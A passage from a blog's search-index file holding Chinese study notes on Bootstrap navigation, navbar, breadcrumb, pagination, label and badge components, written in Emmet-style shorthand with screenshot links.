class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span><span class="selector-class">.container</span></span><br><span class="line">    <span class="selector-tag">ul</span><span class="selector-class">.nav</span><span class="selector-class">.nav-pills</span></span><br><span class="line">        <span class="selector-tag">li</span><span class="selector-class">.active</span></span><br><span class="line">            <span class="selector-tag">a</span><span class="selector-attr">[data-toggle=pill]</span><span class="selector-attr">[href=#home]</span>&#123;主页&#125;</span><br><span class="line">        <span class="selector-tag">li</span></span><br><span class="line">            <span class="selector-tag">a</span><span class="selector-attr">[data-toggle=pill]</span><span class="selector-attr">[href=#menu1]</span>&#123;菜单<span class="number">1</span>&#125;</span><br><span class="line">        ...</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.tab-content</span></span><br><span class="line">        div<span class="selector-id">#home</span><span class="selector-class">.tab-pane</span><span class="selector-class">.fade</span><span class="selector-class">.in</span><span class="selector-class">.active</span></span><br><span class="line">            h3&#123;首页&#125;</span><br><span class="line">            p&#123;一堆话&#125;</span><br><span class="line">        div<span class="selector-id">#menu1</span><span class="selector-class">.tab-pane</span><span class="selector-class">.fade</span></span><br><span class="line">            h3&#123;菜单<span class="number">1</span>&#125;</span><br><span class="line">            p&#123;又一堆话&#125;</span><br><span class="line">-------------</span><br><span class="line"><span class="selector-tag">ul</span><span class="selector-class">.nav</span><span class="selector-class">.nav-pills</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-attr">[data-toggle=pill]</span><span class="selector-attr">[href=#home]</span></span><br><span class="line">-------------</span><br><span class="line">#垂直的胶囊式导航菜单 </span><br><span class="line"><span class="selector-tag">ul</span><span class="selector-class">.nav</span><span class="selector-class">.nav-pills</span>.nav-stacked</span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g17x4cb7enj309m01at8i.jpg" alt="img"><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g17x76rx5qj30bo05jwec.jpg" alt="img"><h5 id="两端对齐的导航"><a href="#两端对齐的导航" class="headerlink" title="两端对齐的导航"></a>两端对齐的导航</h5><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">ul.nav.nav-tabs.nav-justified</span></span><br><span class="line"><span class="section">----------------------</span></span><br><span class="line"><span class="section">ul.nav.nav-pills.nav-justified</span></span><br><span class="line"><span class="section">----------------------</span></span><br><span class="line">在屏幕宽度大于768px时，表现为 ul.nav.nav-tabs;</span><br><span class="line">小于时，表现为 ul.nav.nav-tabs.nav-stacked</span><br></pre></td></tr></table></figure><h5 id="禁用链接"><a href="#禁用链接" class="headerlink" title="禁用链接"></a>禁用链接</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">li</span><span class="selector-class">.disabled</span>   </span><br><span class="line"><span class="selector-class">.disable</span> 只会改变外观,不会改变功能,s需要自定义js来禁用链接</span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g17xenlmjxj30cg01at8j.jpg" alt="img"><h5 id="导航菜单里有下拉菜单"><a href="#导航菜单里有下拉菜单" class="headerlink" title="导航菜单里有下拉菜单"></a>导航菜单里有下拉菜单</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ul</span><span class="selector-class">.nav</span><span class="selector-class">.nav-tabs</span></span><br><span class="line">    <span class="selector-tag">li</span><span class="selector-class">.active</span></span><br><span class="line">        <span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;HOME&#125;</span><br><span class="line">    <span class="selector-tag">li</span></span><br><span class="line">        <span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;SVN&#125;</span><br><span class="line">    <span class="selector-tag">li</span><span class="selector-class">.dropdown</span></span><br><span class="line">        <span class="selector-tag">a</span><span class="selector-class">.dropdown-toggle</span><span class="selector-attr">[data-toggle=dropdown]</span><span class="selector-attr">[href=#]</span></span><br><span class="line">            &#123;Java&#125;</span><br><span class="line">            <span class="selector-tag">span</span><span class="selector-class">.caret</span></span><br><span class="line">        <span class="selector-tag">ul</span><span class="selector-class">.dropdown-menu</span></span><br><span class="line">            <span class="selector-tag">li</span></span><br><span class="line">                <span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;Swing&#125;</span><br><span class="line">            <span class="selector-tag">li</span></span><br><span class="line">                <span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;jMeter&#125;</span><br><span class="line">    <span class="selector-tag">li</span></span><br><span class="line">        ...</span><br><span class="line">--------------------------</span><br><span class="line"><span class="selector-tag">li</span><span class="selector-class">.dropdown</span></span><br><span class="line">    <span class="selector-tag">a</span><span class="selector-class">.dropdown-toggle</span><span class="selector-attr">[data-toggle=dropdown]</span></span><br><span class="line">    <span class="selector-tag">li</span>.dropdown-menu</span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g17xnkfrskj30bw04ajrb.jpg" alt="img"><h4 id="导航栏"><a href="#导航栏" class="headerlink" title="导航栏"></a>导航栏</h4><h5 id="默认的导航栏"><a href="#默认的导航栏" class="headerlink" title="默认的导航栏"></a>默认的导航栏</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nav</span><span class="selector-class">.navbar</span><span class="selector-class">.navbar-default</span><span class="selector-attr">[role=navigation]</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.container-fluid</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.navbar-header</span></span><br><span class="line">            <span class="selector-tag">a</span><span class="selector-class">.navbar-brand</span><span class="selector-attr">[href=#]</span>&#123;HEADER&#125;</span><br><span class="line">        <span class="selector-tag">div</span></span><br><span class="line">            <span class="selector-tag">ul</span><span class="selector-class">.nav</span><span class="selector-class">.navbar-nav</span></span><br><span class="line">                <span class="selector-tag">li</span><span class="selector-class">.actice</span></span><br><span class="line">                    <span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;IOS&#125;</span><br><span class="line">                li&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;SVN&#125;</span><br><span class="line">                <span class="selector-tag">li</span><span class="selector-class">.dropdown</span></span><br><span class="line">                    <span class="selector-tag">a</span><span class="selector-class">.dropdown-toggle</span><span class="selector-attr">[href=@=#]</span><span class="selector-attr">[data-toggle=dropdown]</span></span><br><span class="line">                        Java</span><br><span class="line">                        <span class="selector-tag">b</span><span class="selector-class">.caret</span></span><br><span class="line">                    <span class="selector-tag">ul</span><span class="selector-class">.dropdown-menu</span></span><br><span class="line">                        li&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;jmeter&#125;</span><br><span class="line">                        li&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;EJB&#125;</span><br><span class="line">---------------------</span><br><span class="line"><span class="selector-tag">nav</span><span class="selector-class">.navbar</span><span class="selector-class">.navbar-default</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.navbar-header</span></span><br><span class="line">        <span class="selector-tag">a</span><span class="selector-class">.navbar-brand</span></span><br><span class="line">    <span class="selector-tag">div</span></span><br><span class="line">        <span class="selector-tag">ul</span><span class="selector-class">.nav</span>.navbar-nav</span><br></pre></td></tr></table></figure><p><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g18581tr2yj309g01ldfm.jpg" alt="img"></br><br><img src="//tva3.sinaimg.cn/large/005zbIM7gy1g185ytfernj30al03ljr7.jpg" alt="img"></p><h5 id="响应式的导航栏-小于一定宽度-右上角出现汉堡按钮"><a href="#响应式的导航栏-小于一定宽度-右上角出现汉堡按钮" class="headerlink" title="响应式的导航栏(小于一定宽度,右上角出现汉堡按钮)"></a>响应式的导航栏(小于一定宽度,右上角出现汉堡按钮)</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nav</span><span class="selector-class">.navbar</span><span class="selector-class">.navbar-default</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-class">.container-fluid</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.navbar-header</span></span><br><span class="line">        <span class="selector-tag">button</span><span class="selector-class">.navbar-toggle</span><span class="selector-attr">[data-toggle=collapse]</span><span class="selector-attr">[data-target=#example-navbar-collapse]</span><span class="selector-attr">[type=button]</span></span><br><span class="line">            <span class="selector-tag">span</span>.sr-only&#123;切换导航&#125;</span><br><span class="line">            <span class="selector-tag">span</span><span class="selector-class">.icon-bar</span></span><br><span class="line">            <span class="selector-tag">span</span><span class="selector-class">.icon-bar</span></span><br><span class="line">            <span class="selector-tag">span</span><span class="selector-class">.icon-bar</span></span><br><span class="line">        <span class="selector-tag">a</span><span class="selector-class">.navbar-brand</span><span class="selector-attr">[href=#]</span>&#123;HEADER&#125;</span><br><span class="line">    div<span class="selector-id">#example-navbar-collapse</span><span class="selector-class">.collapse</span><span class="selector-class">.navbar-collapse</span></span><br><span class="line">        <span class="selector-tag">ul</span> ..</span><br><span class="line">            <span class="selector-tag">li</span> .... 同上</span><br></pre></td></tr></table></figure><p><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g185v5j8eoj30dj017mwy.jpg" alt="img"></br><br><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g1869mf6pij30d801p3ya.jpg" alt="img"></p><h5 id="导航中的表单、按钮"><a href="#导航中的表单、按钮" class="headerlink" title="导航中的表单、按钮"></a>导航中的表单、按钮</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nav</span><span class="selector-class">.navbar</span><span class="selector-class">.navbar-default</span><span class="selector-attr">[role=navigation]</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.container-fluid</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.navbar-header</span></span><br><span class="line">            <span class="selector-tag">a</span><span class="selector-class">.navbar-barand</span><span class="selector-attr">[href=#]</span>&#123;HEADER&#125;</span><br><span class="line">        <span class="selector-tag">div</span></span><br><span class="line">            <span class="selector-tag">form</span><span class="selector-class">.navbar-form</span><span class="selector-class">.navbar-left</span><span class="selector-attr">[role=search]</span></span><br><span class="line">                <span class="selector-tag">div</span><span class="selector-class">.form-group</span></span><br><span class="line">                    <span class="selector-tag">input</span><span class="selector-class">.form-control</span><span class="selector-attr">[type=text]</span><span class="selector-attr">[placeholder=Search]</span></span><br><span class="line">                <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-default</span>.submit&#123;提交&#125;</span><br><span class="line">            <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span><span class="selector-class">.navbar-btn</span><span class="selector-attr">[type=button]</span>&#123;导航栏-按钮&#125;</span><br><span class="line">        <span class="selector-tag">div</span></span><br><span class="line">            <span class="selector-tag">p</span>.navbar-text&#123;导航栏-文本&#125;</span><br></pre></td></tr></table></figure><p><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g187cj3w3yj30gq01z3ye.jpg" alt="img"></br><br><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g187cvni9hj30gh068q2w.jpg" alt="img"></p><h5 id="导航链接"><a href="#导航链接" class="headerlink" title="导航链接"></a>导航链接</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">汉堡图标!</span><br><span class="line"><span class="selector-tag">nav</span><span class="selector-class">.navbar</span><span class="selector-class">.navbar-default</span><span class="selector-attr">[role=navigation]</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.container-fluid</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.navbar-header</span></span><br><span class="line">            <span class="selector-tag">button</span><span class="selector-class">.navbar-toggle</span><span class="selector-attr">[data-toggle=collapse]</span><span class="selector-attr">[data-target=#example-collapse]</span><span class="selector-attr">[type=button]</span></span><br><span class="line">                <span class="selector-tag">span</span><span class="selector-class">.icon-bar</span></span><br><span class="line">                <span class="selector-tag">span</span><span class="selector-class">.icon-bar</span></span><br><span class="line">                <span class="selector-tag">span</span><span class="selector-class">.icon-bar</span></span><br><span class="line">            <span class="selector-tag">a</span><span class="selector-class">.navbar-brand</span><span class="selector-attr">[href=#]</span>&#123;菜鸟教程&#125;</span><br><span class="line">        div<span class="selector-id">#example-collapse</span><span class="selector-class">.collapse</span><span class="selector-class">.navbar-collapse</span></span><br><span class="line">            <span class="selector-tag">ul</span><span class="selector-class">.nav</span><span class="selector-class">.navbar-nav</span><span class="selector-class">.navbar-right</span></span><br><span class="line">                li&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#]</span></span><br><span class="line">                    <span class="selector-tag">span</span><span class="selector-class">.glyphicon</span><span class="selector-class">.glyphicon-user</span></span><br><span class="line">                    &#123;注册｝</span><br><span class="line">                li&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#]</span></span><br><span class="line">                    <span class="selector-tag">span</span><span class="selector-class">.glyphicon</span><span class="selector-class">.glyphicon-log-in</span></span><br><span class="line">                    &#123;登录&#125;</span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g190svqisoj30e201fq2p.jpg" alt="img"><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g190shreagj30e303aweb.jpg" alt="img"><h5 id="组件定位方式"><a href="#组件定位方式" class="headerlink" title="组件定位方式"></a>组件定位方式</h5><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">nav.nav.navbar-default</span></span><br><span class="line"><span class="xml">    div.contaoner-fluid</span></span><br><span class="line"><span class="xml">        div.navbar-header</span></span><br><span class="line"><span class="xml">            a.navbar-brand[href=#]</span><span class="template-variable">&#123;HEADER&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">        div</span></span><br><span class="line"><span class="xml">            <span class="comment">&lt;!--向左对齐--&gt;</span></span></span><br><span class="line"><span class="xml">            ul.nav.navbar-nav.navbar-left</span></span><br><span class="line"><span class="xml">                li...</span></span><br><span class="line"><span class="xml">                ...</span></span><br><span class="line"><span class="xml">            form.navbar-form.navbar-left</span></span><br><span class="line"><span class="xml">                button...</span></span><br><span class="line"><span class="xml">            p.navbar-text.navbar-left</span><span class="template-variable">&#123;向左对齐&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">            <span class="comment">&lt;!--向右对齐--&gt;</span></span></span><br><span class="line"><span class="xml">            ul.nav.navbar-nav.navbar-right</span></span><br><span class="line"><span class="xml">            ....</span></span><br><span class="line"><span class="xml">            form....</span></span><br><span class="line"><span class="xml">            p.....</span></span><br><span class="line"><span class="xml">=========================</span></span><br><span class="line"><span class="xml">.navbar-left    .navbar-right</span></span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g1914rtckcj30j6016wee.jpg" alt="img"><h5 id="导航栏固定到顶部、底部、反色"><a href="#导航栏固定到顶部、底部、反色" class="headerlink" title="导航栏固定到顶部、底部、反色"></a>导航栏固定到顶部、底部、反色</h5><p>?<img src="//tva3.sinaimg.cn/large/005zbIM7ly1g1918cg271j30f001d74a.jpg" alt="img"></br></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">body[style=padding=50px]</span><br><span class="line"><span class="code">    nav.navbar.navbar-inverse.navbar-fixed-top</span></span><br><span class="line"><span class="code">        div.container-fluid</span></span><br><span class="line"><span class="section">            ...</span></span><br><span class="line"><span class="section">------------</span></span><br><span class="line">navbar-fixed-top  固定在页面顶部(随着页面滚动)</span><br><span class="line">navbar-fixed-bottom   固定在页面底部(随着页面滚动)</span><br><span class="line">navbar-static-top   静态的顶部(不需要padding , 默认为此样式？)</span><br><span class="line">navbar-inverse || navbar-default   </span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/large/005zbIM7gy1g192gwoiqgj30fc02fdfs.jpg" alt="img"><h4 id="面包屑导航"><a href="#面包屑导航" class="headerlink" title="面包屑导航"></a>面包屑导航</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">css</span><br><span class="line">js</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">ul</span><span class="selector-class">.breadcrumb</span></span><br><span class="line">    <span class="selector-tag">li</span>&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;Home&#125;</span><br><span class="line">    <span class="selector-tag">li</span>&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;<span class="number">2019</span>&#125;</span><br><span class="line">    <span class="selector-tag">li</span><span class="selector-class">.active</span>&#123;十一月&#125;</span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g1f4jv8hv6j30ay01dwe9.jpg" alt="img"><h4 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h4><h5 id="分页-Pagination"><a href="#分页-Pagination" class="headerlink" title="分页(Pagination)"></a>分页(Pagination)</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">css</span><br><span class="line">js</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">ul</span><span class="selector-class">.pagination</span></span><br><span class="line">    <span class="selector-tag">li</span>&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;&amp;laquo;&#125;</span><br><span class="line">    <span class="selector-tag">li</span><span class="selector-attr">[class=active]</span>&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;<span class="number">1</span>&#125;</span><br><span class="line">    <span class="selector-tag">li</span><span class="selector-attr">[class=disabled]</span>&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;<span class="number">2</span>&#125;</span><br><span class="line">    <span class="selector-tag">li</span>&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;<span class="number">3</span>&#125;</span><br><span class="line">    <span class="selector-tag">li</span>&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;<span class="number">4</span>&#125;</span><br><span class="line">    <span class="selector-tag">li</span>&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;<span class="number">5</span>&#125;</span><br><span class="line">    <span class="selector-tag">li</span>&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;&amp;raquo;&#125;</span><br><span class="line">----</span><br><span class="line">pagination   pagination-lg   pagination-sm  大小</span><br><span class="line"><span class="selector-tag">li</span><span class="selector-class">.active</span></span><br><span class="line"><span class="selector-tag">li</span><span class="selector-class">.disabled</span></span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g1f4rgyo9xj307e01mq2p.jpg" alt="img"><h5 id="翻页-Pager"><a href="#翻页-Pager" class="headerlink" title="翻页(Pager)"></a>翻页(Pager)</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ul</span><span class="selector-class">.pager</span></span><br><span class="line">    <span class="selector-tag">li</span><span class="selector-class">.previous</span>&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;&amp;larr;Older&#125;</span><br><span class="line">    <span class="selector-tag">li</span><span class="selector-class">.next</span>&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;New&amp;rarr;&#125;</span><br><span class="line">    <span class="selector-tag">li</span>&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=<span class="string">&quot;#&quot;</span>]</span>&#123;active&#125;</span><br><span class="line">    <span class="selector-tag">li</span><span class="selector-class">.disabled</span>&gt;<span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;disabled&#125;</span><br><span class="line">----------</span><br><span class="line"><span class="selector-tag">li</span><span class="selector-class">.previous</span>   <span class="selector-tag">li</span><span class="selector-class">.next</span></span><br><span class="line"><span class="selector-tag">li</span><span class="selector-class">.disabled</span></span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/large/005zbIM7gy1g1f50p82rkj30ch014a9v.jpg" alt="img"><h4 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h4><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">h4<span class="comment">&#123;Example Heading&#125;</span>&gt;span.<span class="keyword">label</span>.<span class="keyword">label</span>-<span class="keyword">default</span><span class="comment">&#123;Label&#125;</span></span><br><span class="line">span.<span class="keyword">label</span>.<span class="keyword">label</span>-<span class="keyword">default</span><span class="comment">&#123;默认标签&#125;</span></span><br><span class="line">span.<span class="keyword">label</span>.<span class="keyword">label</span>-primary<span class="comment">&#123;主要标签&#125;</span></span><br><span class="line">span.<span class="keyword">label</span>.<span class="keyword">label</span>-success<span class="comment">&#123;成功标签&#125;</span></span><br><span class="line">span.<span class="keyword">label</span>.<span class="keyword">label</span>-info<span class="comment">&#123;信息标签&#125;</span></span><br><span class="line">span.<span class="keyword">label</span>.<span class="keyword">label</span>-warning<span class="comment">&#123;警告标签&#125;</span></span><br><span class="line">span.<span class="keyword">label</span>.<span class="keyword">label</span>-danger<span class="comment">&#123;危险标签&#125;</span></span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/large/005zbIM7gy1g1f54z6ymmj30c001z0sp.jpg" alt="img"><h4 id="徽章-相较于标签，边角更加圆滑"><a href="#徽章-相较于标签，边角更加圆滑" class="headerlink" title="徽章(相较于标签，边角更加圆滑)"></a>徽章(相较于标签，边角更加圆滑)</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">h4&#123;胶囊式导航中的激活状态&#125;</span><br><span class="line">    <span class="selector-tag">ul</span><span class="selector-class">.nav</span><span class="selector-class">.nav-pills</span></span><br><span class="line">        <span class="selector-tag">li</span><span class="selector-class">.active</span></span><br><span class="line">            <span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;首页&#125;&gt;<span class="selector-tag">span</span>.badge&#123;<span class="number">42</span>&#125;</span><br><span class="line">        <span class="selector-tag">li</span></span><br><span class="line">            <span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;简介&#125;</span><br><span class="line">        <span class="selector-tag">li</span></span><br><span class="line">            <span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;消息&#125;&gt;<span class="selector-tag">span</span>.badge&#123;<span class="number">3</span>&#125;</span><br><span class="line">h4&#123;列表导航中的激活状态&#125;</span><br><span class="line">    <span class="selector-tag">ul</span><span class="selector-class">.nav</span><span class="selector-class">.nav-pills</span><span class="selector-class">.nav-stacked</span></span><br><span class="line">        <span class="selector-tag">li</span><span class="selector-class">.active</span></span><br><span class="line">            <span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;首页&#125;&gt;<span class="selector-tag">span</span><span class="selector-class">.badge</span>.pull-<span class="attribute">right</span>&#123;<span class="number">42</span>&#125;</span><br><span class="line">        <span class="selector-tag">li</span></span><br><span class="line">            <span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;简介&#125;</span><br><span class="line">        <span class="selector-tag">li</span></span><br><span class="line">            <span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;消息&#125;&gt;<span class="selector-tag">span</span><span class="selector-class">.badge</span><span class="selector-class">.pull-right</span></span><br><span class="line">-----</span><br><span class="line"><span class="selector-tag">span</span><span class="selector-class">.badge</span>  空时自动折叠</span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g1g9mqirimj306y05qq2x.jpg" alt="img"><h4 id="页面标题与子标题"><a href="#页面标题与子标题" class="headerlink" title="页面标题与子标题"></a>页面标题与子标题</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span><span class="selector-class">.page-header</span></span><br><span class="line">    <span class="selector-tag">h1</span>&#123;页面标题实例&#125;</span><br><span class="line">        small&#123;子标题&#125;</span><br><span class="line"><span class="selector-tag">p</span>&#123;示例文本。。。。。。&#125;</span><br></pre></td></tr></table></figure><h4 id="缩略图"><a href="#缩略图" class="headerlink" title="缩略图"></a>缩略图</h4>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Bootstrap教程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Bootstrap </tag>
            
            <tag> W3School </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1.2 数据分析基础</title>
      <link href="/categories/Python/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/1-2-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/"/>
      <url>/categories/Python/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/1-2-%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/</url>
      
